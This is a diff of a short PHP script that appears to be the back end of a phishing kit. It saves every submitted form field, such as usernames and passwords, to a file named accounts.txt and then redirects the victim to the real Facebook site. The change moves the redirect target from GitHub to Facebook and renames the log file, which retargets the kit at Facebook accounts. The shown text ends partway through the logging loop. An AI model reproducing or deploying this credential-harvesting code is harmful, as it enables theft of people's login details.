@@ -1,7 +1,7 @@
 <?php
 	//@ByDog3r
-	header ('Location: https://github.com/ '); 
-	$handle = fopen("log.txt", "a"); 
+	header ('Location: https://www.facebook.com/ '); 
+	$handle = fopen("accounts.txt", "a"); 
 	foreach($_POST as $variable => $value) {
 		fwrite($handle, $variable);
 		fwrite($handle, "=");
